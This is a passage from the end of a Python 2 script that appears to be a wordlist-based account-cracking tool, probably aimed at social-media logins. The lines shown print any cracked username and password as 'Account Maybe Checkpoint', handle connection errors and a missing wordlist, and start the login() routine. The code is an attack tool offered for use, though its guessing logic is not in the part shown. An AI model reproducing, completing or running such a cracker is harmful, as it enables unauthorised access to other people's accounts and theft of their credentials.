                        print '\x1b[1;36;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
                        print '\x1b[1;97m[!] \x1b[1;97mAccount Maybe Checkpoint'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;97m[!] File not found...'
            print "\n\x1b[1;97m[!] \x1b[1;97mLooks like you don't have a wordlist"
            super()


if __name__ == '__main__':
    login()